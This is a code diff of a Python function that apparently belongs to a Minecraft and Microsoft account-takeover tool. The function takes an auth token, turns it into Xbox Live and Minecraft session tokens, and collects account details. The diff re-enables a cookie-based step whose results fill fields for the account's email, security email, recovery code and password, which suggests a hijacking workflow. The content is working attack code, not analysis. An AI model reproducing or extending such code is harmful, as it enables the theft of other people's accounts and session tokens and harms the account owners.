@@ -56,12 +56,13 @@ def secure(msaauth: str):
 
         return accountInfo
     
+    # Minecraft checking
     print("[~] - Checking Minecraft Account")
     XBLResponse = getXBL(host)
 
     if XBLResponse:
         print("[+] - Got XBL")
-        
+
         # XBL && Token
         xbl = XBLResponse["xbl"]
         ssid =  getSSID(xbl)
@@ -71,7 +72,6 @@ def secure(msaauth: str):
             print("[+] - Got SSID!")
             accountInfo["SSID"] = ssid
 
-            # Might replace with a non ssid request (uuid based)
             capes = getCapes(ssid)
             if capes:
                 accountInfo["capes"] = ", ".join(i["alias"] for i in capes)
@@ -98,26 +98,31 @@ def secure(msaauth: str):
         print("[x] - Failed to get XBL")
         accountInfo["oldName"] = "No Minecraft"
 
-    # Not Working (check)
-    # Check bellow
-    # T = getT()
-    # if T == "Locked":
-    #     accountInfo["email"] = "Locked"
-    #     accountInfo["secEmail"] = "Locked"
-    #     accountInfo["recoveryCode"] = "Locked"
-    #     accountInfo["password"] = "Locked"
-    #     accountInfo["status"] = "Locked"
+    T = getT(msaauth, cookies[2])
+    if T == "Locked":
+        accountInfo["email"] = "Locked"
+        accountInfo["secEmail"] = "Locked"
+        accountInfo["recoveryCode"] = "Locked"
+        accountInfo["password"] = "Locked"
+        accountInfo["status"] = "Locked"
 
-    #     return accountInfo
+        return accountInfo
 
-    # if T == "Down":
-    #     accountInfo["email"] = "Microsoft Down"
-    #     accountInfo["secEmail"] = "Microsoft Down"
-    #     accountInfo["recoveryCode"] = "Microsoft Down"
-    #     accountInfo["password"] = "Microsoft Down"
-    #     accountInfo["status"] = "Microsoft Down"
+    elif T == "Down":
+        accountInfo["email"] = "Microsoft Down"
+        accountInfo["secEmail"] = "Microsoft Down"
+        accountInfo["recoveryCode"] = "Microsoft Down"
+        accountInfo["password"] = "Microsoft Down"
+        accountInfo["status"] = "Microsoft Down"
 
-    #     return accountInfo
+        return accountInfo
+    
+    else:
+        
+        print("[+] - Found T")
+        return accountInfo
+
+    # Security Steps
 
     # if T:
     #     print("[+] - Found T")
